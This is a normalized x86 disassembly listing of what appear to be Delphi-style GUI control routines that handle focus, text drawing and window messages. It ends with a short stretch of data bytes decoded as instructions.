mov ecx esi
mov edx [ esp ]
mov eax [ ebx + 0x160 ]
call sub_42517c
mov ecx esi
mov edx [ esp + 0x8 ]
mov eax [ ebx + 0x160 ]
call sub_42511c
add esp 0x10
pop esi
pop ebx
retn
test [ ebx + 0x1a8 ] 0x2
je r-xdata
inc [ esp + 0x4 ]
sub_4786f0
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd8 ]
mov [ ebx + 0x1b0 ] 0x0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax ebx
call sub_483b60
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
cmp [ eax + 0x95 ] 0x0
jne r-xdata
mov dl 0x1
call sub_459528
sub_478744
push ebx
push esi
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x1a8 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
mov esi [ ebx + 0x4c ]
test [ esp ] 0x2
je r-xdata
test [ esp ] 0x2
jne r-xdata
test [ ebx + 0x1a8 ] 0x2
jne r-xdata
test [ esp ] 0x8
je r-xdata
test [ ebx + 0x1a8 ] 0x2
je r-xdata
inc esi
jmp r-xdata
test [ esp ] 0x8
jne r-xdata
test [ ebx + 0x1a8 ] 0x8
jne r-xdata
dec esi
mov eax ebx
call sub_4840c8
call sub_4809c8
test eax eax
je r-xdata
test [ ebx + 0x1a8 ] 0x8
je r-xdata
inc esi
jmp r-xdata
mov al [ esp ]
mov [ ebx + 0x1a8 ] al
mov edx esi
mov eax ebx
call sub_44c02c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp ebx [ eax + 0x40 ]
jne r-xdata
dec esi
inc esi
sub_4787d4
push esi
mov esi eax
mov eax esi
call sub_44e5f0
cmp [ esi + 0x5d ] 0x1
je r-xdata
pop esi
retn
mov eax [ esi + 0x16c ]
test eax eax
je r-xdata
test [ esi + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd8 ]
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov eax [ esi + 0x1ac ]
test eax eax
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd8 ]
mov eax esi
call sub_4840c8
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
mov eax [ eax + 0x2c4 ]
xor edx edx
mov [ eax + 0x28c ] edx
mov [ esi + 0x1b0 ] 0x1
jmp r-xdata
sub_478864
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4788c4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4840dc
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_44c874
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_461b54
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x1c8 ]
call sub_40408c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4788cb
lea eax [ ebp - 0x8 ]
call sub_404038
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_4788d0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_47896a
push [ fs : eax ]
mov [ fs : eax ] esp
test bl bl
jne r-xdata
mov edx ebx
mov eax esi
call sub_4839c8
mov eax [ esi + 0x1ac ]
test eax eax
je r-xdata
mov [ esi + 0x1b0 ] 0x0
test bl bl
je r-xdata
mov edx esi
call sub_473fd4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478971
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax [ esi + 0x16c ]
call sub_47eb64
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46dc70
mov eax [ esi + 0x16c ]
call sub_47eb64
mov eax [ eax + 0x7c ]
lea edx [ ebp - 0x4 ]
call sub_449958
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46d8d8
jmp r-xdata
sub_478978
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_483c34
mov eax ebx
call sub_4840c8
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_4840c8
mov edx [ r-xdata ]
call sub_403458
mov edx [ eax + 0x2c4 ]
test edx edx
je r-xdata
cmp [ edx + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call SetFocus
sub_4789d8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
push edi
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_483c68
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403458
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x40 ]
cmp eax [ esi + 0x16c ]
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax esi
call sub_4840c8
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax [ esi + 0x1ac ]
mov eax [ eax + 0x2c4 ]
mov eax [ eax + 0x28c ]
test eax eax
je r-xdata
mov eax [ esi + 0x16c ]
mov eax [ eax + 0x18 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax esi
call sub_4840c8
cmp [ eax + 0x296 ] 0x0
je r-xdata
mov eax [ eax + 0x16c ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx + 0x40 ]
jne r-xdata
mov eax [ esi + 0x16c ]
mov eax [ eax + 0x18 ]
mov edx [ r-xdata ]
call sub_403458
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x17c ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd8 ]
mov eax [ esi + 0x1ac ]
mov eax [ eax + 0x2c4 ]
xor edx edx
mov [ eax + 0x28c ] edx
sub_478ae8
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx eax
mov eax ebx
call sub_4841e0
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xbc ]
mov esi [ ebx + 0x1c4 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
mov eax [ esp + 0x4 ]
cmp eax 0x10
jle r-xdata
mov eax [ ebx + 0x1c4 ]
mov ecx 0x3
cdq
idiv ecx
mov esi eax
add esi esi
jmp r-xdata
cmp [ ebx + 0x16c ] 0x0
je r-xdata
mov esi eax
add esi 0x4
add esp 0x28
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
cmp eax 0x10
jg r-xdata
mov edi eax
add edi 0x6
mov edi 0x18
jmp r-xdata
mov edx [ ebx + 0x19c ]
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push edi
lea esi [ ebx + 0x190 ]
lea edi [ esp + 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax esi
sar eax 0x1
jns r-xdata
sub eax edx
dec eax
push eax
mov eax 0x18
sub eax [ ebx + 0x190 ]
push eax
lea eax [ esp + 0x10 ]
push eax
call OffsetRect
push esi
push edi
lea esi [ esp + 0x10 ]
lea edi [ ebx + 0x190 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
push 0x0
lea eax [ esp + 0x1c ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_417298
push esi
push edi
lea esi [ esp + 0x20 ]
lea edi [ ebx + 0x1b1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ ebx + 0x16c ]
cmp [ eax + 0x48 ] 0x0
je r-xdata
adc edx 0x0
mov edi [ ebx + 0x198 ]
add edi [ ebx + 0x190 ]
push 0x400
lea eax [ ebx + 0x1b1 ]
push eax
push 0xffffffff
mov eax [ ebx + 0x16c ]
mov eax [ eax + 0x54 ]
call sub_4044f8
push eax
mov eax [ ebx + 0x160 ]
call sub_425570
push eax
call DrawTextA
mov eax [ ebx + 0x194 ]
mov [ ebx + 0x1b5 ] eax
mov eax [ ebx + 0x19c ]
mov [ ebx + 0x1bd ] eax
mov eax [ ebx + 0x198 ]
add eax [ ebx + 0x1b9 ]
add edi eax
add edi [ ebx + 0x18c ]
jmp r-xdata
push edi
push esi
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_478c60
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_4827e0
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xbc ]
mov eax [ esp + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x4c ]
sar edx 0x1
jns r-xdata
adc eax 0x0
sub edx eax
inc edx
mov ecx esp
mov eax [ ebx + 0x17a ]
call sub_41725c
mov eax [ esp ]
mov [ ebx + 0x172 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x176 ] eax
add esp 0x10
pop ebx
retn
adc edx 0x0
sub_478cbc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
call sub_4044e8
xor eax eax
push ebp
push sub_478dbe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x30 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
cmp [ ebx + 0x18a ] 0x0
je r-xdata
mov eax ebx
call sub_4840c8
cmp [ eax + 0x248 ] 0x0
jne r-xdata
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
mov ecx esi
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_4832f4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x9c ]
test al al
je r-xdata
mov eax ebx
call sub_4840c8
call sub_48254c
mov edi [ eax + 0x54 ]
lea eax [ ebp + 0x10 ]
mov edx [ ebx + 0x1c8 ]
call sub_4040d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478dc5
lea eax [ ebp + 0x10 ]
call sub_404038
retn
mov edx 0x2
mov eax ebx
call sub_44eba4
mov esi eax
push esi
push edi
lea esi [ ebx + 0x1b1 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
push 0x0
mov eax [ ebx + 0x48 ]
sub eax 0x15
sub eax [ ebx + 0x1b9 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call OffsetRect
mov eax [ ebx + 0x16c ]
mov eax [ eax + 0x54 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
mov ecx esi
lea edx [ ebp - 0x20 ]
mov eax ebx
call sub_4832f4
sub_478dd0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
call sub_4044e8
xor eax eax
push ebp
push sub_478ea3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x30 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
call sub_483284
mov eax ebx
mov edx [ eax ]
call [ edx + 0x9c ]
test al al
je r-xdata
mov eax ebx
call sub_4840c8
cmp [ eax + 0x248 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478eaa
lea eax [ ebp + 0x8 ]
call sub_404038
retn
mov edx 0x2
mov eax ebx
call sub_44eba4
mov [ esi ] eax
push esi
lea esi [ ebx + 0x1b1 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0x0
mov eax [ ebx + 0x48 ]
sub eax 0x15
sub eax [ ebx + 0x1b9 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov eax [ ebx + 0x16c ]
mov eax [ eax + 0x54 ]
push eax
mov ecx esi
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_483284
lea eax [ ebp + 0x8 ]
mov edx [ ebx + 0x1c8 ]
call sub_4040d0
sub_478eb4
push esi
push edi
mov esi eax
mov eax esi
call sub_4837ac
mov eax [ esi + 0x16c ]
test eax eax
je r-xdata
mov edi [ esi + 0x1ac ]
cmp [ edi + 0x295 ] 0x0
jne r-xdata
mov [ eax + 0x3c ] 0x1
pop edi
pop esi
retn
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x164 ]
sub_478eec
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
test eax eax
je r-xdata
xor ebx ebx
call sub_4193b8
mov ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4842f0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
call sub_4840c8
call sub_44f950
mov eax [ ebp - 0x4 ]
call sub_4840c8
mov eax [ eax + 0x210 ]
call sub_47d6b0
mov edx [ eax ]
call [ edx + 0x20 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403458
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_4840c8
mov edi [ eax + 0x214 ]
mov eax edi
mov si 0xffec
call sub_4034a4
push eax
mov eax [ ebp - 0x4 ]
call sub_4840c8
mov eax [ eax + 0x210 ]
call sub_47d6b0
mov ecx eax
mov dl 0x1
pop eax
call [ eax + 0x1c ]
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4790f7
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4790b0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_47f23c
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x48 ]
mov eax [ ebp - 0x8 ]
call sub_47ef98
mov eax [ ebp - 0x4 ]
call sub_4840c8
mov eax [ eax + 0x214 ]
mov eax [ eax + 0x6c ]
mov edx [ eax + 0x28 ]
mov eax [ ebp - 0x8 ]
call sub_47f0b8
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x8 ]
call sub_47d6b0
mov edx [ eax ]
call [ edx + 0x20 ]
mov eax [ ebp - 0x10 ]
call sub_47f560
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4840c8
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0xd4 ]
mov eax [ ebp - 0x10 ]
call sub_47f560
test eax eax
setg dl
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4790b7
mov eax [ ebp - 0x8 ]
call sub_47d6b0
mov edx [ eax ]
call [ edx + 0x24 ]
retn
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x4 ]
call sub_4840c8
mov ebx [ eax + 0x214 ]
mov eax ebx
mov si 0xffec
call sub_4034a4
push eax
mov eax [ ebp - 0x8 ]
call sub_47d6b0
mov ecx eax
mov dl 0x1
pop eax
call [ eax + 0x1c ]
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_47f52c
mov edx eax
mov eax ebx
call sub_47ee8c
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x5c ]
mov eax ebx
call sub_47f0b8
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_4790b7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4840c8
mov eax [ eax + 0x210 ]
call sub_47d6b0
mov edx [ eax ]
call [ edx + 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_4840c8
call sub_44f958
mov eax [ ebp - 0x4 ]
call sub_4840c8
call sub_47b62c
retn
sub_479118
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_44e1ec
test bl bl
jne r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ esi + 0x16c ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
push esi
push 0x0
push 0xb403
mov eax [ esi + 0x30 ]
call sub_4530b8
push eax
call PostMessageA
cmp [ eax + 0x95 ] 0x0
jne r-xdata
mov dl 0x1
call sub_459528
sub_4791ac
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_470c50
mov [ esi + 0x1b0 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4791e8
push ebx
push esi
push edi
call sub_403674
mov ebx edx
mov edi eax
mov esi [ edi + 0x16c ]
test esi esi
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4826c0
test bl bl
jle r-xdata
mov eax [ esi + 0x18 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40365c
mov eax [ esi + 0x18 ]
mov edx [ eax ]
call [ edx + 0x17c ]
sub_479258
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_470cb8
cmp [ ebx + 0x1b1 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x16c ]
test esi esi
je r-xdata
mov eax esi
call sub_47eb64
test eax eax
jne r-xdata
mov eax ebx
call sub_4795d4
cmp [ eax + 0x296 ] 0x0
je r-xdata
cmp [ ebx + 0x1b0 ] 0x0
je r-xdata
cmp [ ebx + 0x18a ] 0x0
je r-xdata
push ebx
push 0x0
push 0xb403
mov eax ebx
call sub_4840c8
call sub_4530b8
push eax
call PostMessageA
mov [ ebx + 0x1b0 ] 0x0
mov eax ebx
call sub_4795d4
mov edx [ eax ]
call [ edx + 0x17c ]
jmp r-xdata
mov eax ebx
call sub_4795d4
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x150 ]
jmp r-xdata
cmp [ ebx + 0x18a ] 0x0
je r-xdata
mov eax [ ebx + 0x16c ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
sub_479308
push ebx
push esi
mov esi eax
mov eax esi
call sub_470d48
mov eax esi
call sub_4795d4
cmp [ eax + 0x297 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov ebx [ esi + 0x16c ]
test ebx ebx
je r-xdata
mov eax esi
call sub_4840c8
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
mov eax ebx
call sub_47eb64
test eax eax
jne r-xdata
cmp [ esi + 0x18a ] 0x0
jne r-xdata
mov eax esi
call sub_4795d4
cmp [ eax + 0x296 ] 0x0
je r-xdata
mov [ esi + 0x1b1 ] 0x1
mov eax esi
mov si 0xffeb
call sub_4034a4
sub_47937c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4842f0
mov eax [ ebx + 0x44 ]
add eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4840c8
mov ecx [ ebx + 0x40 ]
add ecx edi
mov edx esi
mov esi [ eax ]
call [ esi + 0xe0 ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_4840c8
mov [ eax + 0x296 ] 0x0
mov eax ebx
call sub_4840c8
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
sub_4793f4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_483c68
cmp [ esi ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
mov eax ebx
call sub_4840c8
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
cmp [ ebx + 0x18a ] 0x0
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_403458
mov esi eax
mov eax [ esi + 0x40 ]
cmp eax [ ebx + 0x16c ]
jne r-xdata
mov [ ebx + 0x1b1 ] 0x1
mov eax ebx
mov si 0xffeb
call sub_4034a4
mov eax ebx
call sub_4840c8
test eax eax
je r-xdata
mov eax ebx
call sub_4840c8
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax ebx
call sub_4840c8
mov edx [ r-xdata ]
call sub_403458
call sub_473b98
sub_4794c0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
call sub_4044e8
xor eax eax
push ebp
push sub_4795c2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_4040d0
mov esi [ ebx + 0x30 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_483284
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4795c9
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_40405c
lea eax [ ebp + 0x8 ]
call sub_404038
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403458
mov esi eax
cmp [ esi + 0x248 ] 0x0
jne r-xdata
cmp [ esi + 0x30d ] 0x0
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_461b54
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
call sub_4040d0
cmp [ ebx + 0x18a ] 0x0
je r-xdata
cmp [ ebx + 0x1ab ] 0x0
jne r-xdata
mov eax ebx
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x3c ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
call sub_4244a4
mov eax ebx
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x48 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
call sub_4244a4
sub_479604
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_470e7c
mov eax esi
call sub_4795d4
mov al [ eax + 0x296 ]
mov [ esi + 0x1b0 ] al
mov eax ebx
sub al 0x1
jb r-xdata
cmp [ esi + 0x1b0 ] 0x0
jne r-xdata
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd8 ]
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
call sub_4795d4
cmp [ eax + 0x296 ] 0x0
je r-xdata
jmp r-xdata
push esi
push 0x0
push 0xb403
mov eax esi
call sub_4795d4
call sub_4530b8
push eax
call PostMessageA
jmp r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x17c ]
mov eax esi
call sub_4795d4
mov edx [ eax ]
call [ edx + 0x17c ]
sub_4796c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
mov [ esi + 0x1b1 ] 0x0
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_470f70
test bl bl
jne r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
cmp [ esi + 0x1b0 ] 0x0
je r-xdata
mov eax esi
call sub_4795d4
mov edx [ eax ]
call [ edx + 0x17c ]
sub_47970c
push ebx
push esi
mov esi eax
mov bl [ esi + 0x1ae ]
mov eax [ esi + 0x16c ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax esi
call sub_4710b4
mov [ esi + 0x1ae ] bl
pop esi
pop ebx
retn
mov [ esi + 0x1ae ] 0x2
sub_479740
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4797c8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
inc eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov edx [ rw-data ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4797cf
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
sub_4797d4
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x48 ]
retn
mov eax [ rw-data ]
call sub_40d4f0
sub_479810
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_479835
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47983c
retn
sub_479a38
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x479a ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebx * 4 + 0x40047 ] cl
add [ eax ] al
mov al 0x10
inc eax
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax - 0x57ffbfce ] bl
sub al [ eax ]
test al 0x2a
inc eax
add [ eax + 0xf00402a ] ch
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
add ah cl
add [ eax ] al
add [ ebx + eax * 4 + 0x45 ] bh
je r-xdata
add [ eax ] cl
nop
inc ecx
